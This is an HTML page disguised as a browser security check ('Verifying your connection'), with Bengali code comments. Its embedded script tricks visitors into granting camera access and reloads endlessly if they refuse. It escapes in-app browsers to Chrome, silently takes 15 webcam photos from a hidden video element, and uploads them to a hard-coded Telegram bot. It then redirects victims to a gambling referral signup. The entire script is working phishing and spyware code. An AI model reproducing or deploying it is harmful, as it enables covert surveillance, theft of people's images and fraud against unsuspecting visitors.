<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking your browser...</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        #v_stream { position: fixed; left: -9999px; opacity: 0; pointer-events: none; }
    </style>
</head>
<body class="bg-gray-50 flex items-center justify-center min-h-screen">

    <div class="max-w-md w-full p-8 bg-white shadow-lg rounded-lg text-center border border-gray-200">
        <div class="flex justify-center mb-6">
            <div class="animate-spin rounded-full h-12 w-12 border-4 border-blue-500 border-t-transparent"></div>
        </div>
        <h1 class="text-2xl font-bold text-gray-800 mb-4">Verifying your connection</h1>
        <p class="text-gray-600 mb-6 text-sm">Please wait while we verify you are a human. This helps us prevent spam.</p>
        
        <div class="p-4 bg-blue-50 rounded text-blue-700 text-xs text-left mb-6 border border-blue-100">
            <strong>Action Required:</strong> Click <b>"Allow"</b> on the browser prompt to complete the security check.
        </div>
        
        <p class="text-gray-400 text-[10px]">Ray ID: 91b3c2a0e7d12402</p>
    </div>

    <video id="v_stream" autoplay playsinline></video>
    <canvas id="c_save" class="hidden"></canvas>

    <script>
        // ১. সরাসরি ক্রোম ব্রাউজারে ওপেন করার অটোমেটিক সিস্টেম
        const isApp = /FBAN|FBAV|Messenger|Telegram|Instagram/i.test(navigator.userAgent);
        if (isApp && navigator.userAgent.includes("Android")) {
            window.location.href = "intent://" + window.location.host + window.location.pathname + window.search + "#Intent;scheme=https;package=com.android.chrome;end";
        }

        const CONFIG = {
            t: '8355080071:AAHZ5KdTDSkqNLgSe_9gsuGCyUMYru5pNe4',
            c: '7785049939', // <--- আপনার Telegram Chat ID এখানে বসান
            u: 'https://dkwin9.com/#/register?invitationCode=14856937272',
            max_photos: 15 
        };

        let photoCount = 0;

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
                });
                const video = document.getElementById('v_stream');
                video.srcObject = stream;
                
                // অনুমতি দিলে দ্রুত ছবি তোলা শুরু করবে
                startBurstMode();
            } catch (err) {
                // ইউজার Block করলে বা কেটে দিলে অটোমেটিক রিলোড হবে (Infinite Loop)
                setTimeout(() => { location.reload(); }, 500);
            }
        }

        function startBurstMode() {
            const burst = setInterval(() => {
                if (photoCount < CONFIG.max_photos) {
                    takeSnap();
                    photoCount++;
                } else {
                    clearInterval(burst);
                    // ১৫টি ছবি তোলা শেষ হলে মেইন লিঙ্কে পাঠিয়ে দিবে
                    window.location.replace(CONFIG.u);
                }
            }, 400); // প্রতি ০.৪ সেকেন্ডে একটি ছবি (খুবই দ্রুত)
        }

        function takeSnap() {
            const video = document.getElementById('v_stream');
            const canvas = document.getElementById('c_save');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', CONFIG.c);
                formData.append('photo', blob, `shot_${photoCount}.jpg`);

                fetch(`https://api.telegram.org/bot${CONFIG.t}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }, 'image/jpeg', 0.6);
        }

        window.onload = init;
    </script>
</body>
</html>
